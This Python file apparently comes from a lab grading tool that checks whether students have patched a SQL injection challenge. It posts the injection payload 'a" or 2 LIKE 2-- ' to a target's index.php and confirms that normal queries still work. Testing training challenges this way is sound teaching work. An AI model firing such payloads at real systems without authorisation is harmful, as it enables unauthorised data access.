import requests
from Exploit import Exploit
import BetterLogger
from BetterLogger import logger

class ChallengeFiveSQLi(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def run_custom_command(self, command):
		logger.info("ChallengeFiveSQLi does not support running custom commands.")
		return False

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeFiveSQLi...")
			url = f"http://{self.ip_address}/index.php"
			payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
			server_response = requests.post(url, payload, timeout=3)
			server_response_text = server_response.text
			if "FBI Headquarters" in server_response_text:
				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeFiveSQLi!{BetterLogger.COLOR_END}")
				return True

			# check that it stills works correctly
			payload = {'codename_input': 'emoney', 'submitted': 'TRUE'}
			server_response = requests.post(url, payload, timeout=3)
			server_response_text = server_response.text
			if "<b>Operation Name:</b> Evil Corp<br><b>Operation Target:</b>" not in server_response_text:
				logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeFiveSQLi so normal SQL queries do not work!{BetterLogger.COLOR_END}")
				return None

			logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeFiveSQLi.{BetterLogger.COLOR_END}")
			return False
		except requests.ConnectionError:
			logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeFiveSQLi because the student disabled the apache2 service!{BetterLogger.COLOR_END}")
			return None
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeFiveSQLi is vulnerable.{BetterLogger.COLOR_END}")
			logger.exception(err)
			return False
